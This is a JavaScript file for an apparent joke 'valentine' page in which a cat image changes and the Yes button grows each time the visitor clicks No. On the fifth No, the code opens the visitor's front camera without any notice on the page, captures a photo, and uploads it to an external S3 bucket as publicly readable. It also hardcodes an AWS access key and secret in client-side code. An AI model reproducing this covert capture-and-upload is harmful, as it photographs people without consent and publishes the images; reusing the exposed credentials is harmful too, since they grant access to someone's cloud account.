"use strict";

const titleElement = document.querySelector(".title");
const buttonsContainer = document.querySelector(".buttons");
const yesButton = document.querySelector(".btn--yes");
const noButton = document.querySelector(".btn--no");
const catImg = document.querySelector(".cat-img");

const MAX_IMAGES = 5;

let play = true;
let noCount = 0;

yesButton.addEventListener("click", handleYesClick);

noButton.addEventListener("click", function () {
  if (play) {
    noCount++;
    const imageIndex = Math.min(noCount, MAX_IMAGES);
    changeImage(imageIndex);
    resizeYesButton();
    updateNoButtonText();
    if (noCount === MAX_IMAGES) {
      handleLastButtonClick();
      play = false;
    }
  }
});

function handleYesClick() {
  titleElement.innerHTML = "Yayyy!! :3";
  buttonsContainer.classList.add("hidden");
  changeImage("yes");
}

function handleLastButtonClick() {
  if (noCount === 5) {
    titleElement.innerHTML = "Asa arati tu si vrei ceva mai bun";
    capturePhoto();
  } else {
    updateNoButtonText();
  }
}

async function capturePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    video.addEventListener('loadedmetadata', () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imgUrl = canvas.toDataURL('image/png');
      catImg.src = imgUrl;
      buttonsContainer.classList.add("hidden");
      uploadPhotoToS3(imgUrl); // Upload photo to S3
      video.remove();
    });
  } catch (err) {
    console.error('Error accessing camera: ', err);
  }
}

function resizeYesButton() {
  const computedStyle = window.getComputedStyle(yesButton);
  const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
  const newFontSize = fontSize * 1.6;

  yesButton.style.fontSize = `${newFontSize}px`;
}

function generateMessage(noCount) {
  const messages = [
    "No",
    "Are you sure?",
    "Pookie please",
    "Don't do this to me :(",
    "You're breaking my heart",
    "I'm gonna cry...",
  ];

  const messageIndex = Math.min(noCount, messages.length - 1);
  return messages[messageIndex];
}

function changeImage(image) {
  catImg.src = `img/cat-${image}.jpg`;
}

function updateNoButtonText() {
  noButton.innerHTML = generateMessage(noCount);
}

function uploadPhotoToS3(imageUrl) {
  const bucketName = 'arcadiebucketname';
  const s3 = new AWS.S3({
    apiVersion: '2006-03-01',
    region: 'Europe (Frankfurt) eu-central-1',
    credentials: {
      accessKeyId: 'AKIA4MTWKUSU3N62YDX6',
      secretAccessKey: 'e7AHk0a+YTLdps1PmWjUwBXpJ5ZcywqsGrG+sYLj'
    }
  });

  const base64Data = imageUrl.replace(/^data:image\/\w+;base64,/, '');
  const buffer = new Buffer.from(base64Data, 'base64');

  const params = {
    Bucket: bucketName,
    Key: `image_${Date.now()}.png`,
    Body: buffer,
    ContentType: 'image/png',
    ACL: 'public-read'
  };

  s3.upload(params, (err, data) => {
    if (err) {
      console.error('Error uploading photo to S3:', err);
    } else {
      console.log('Photo uploaded to S3:', data.Location);
    }
  });
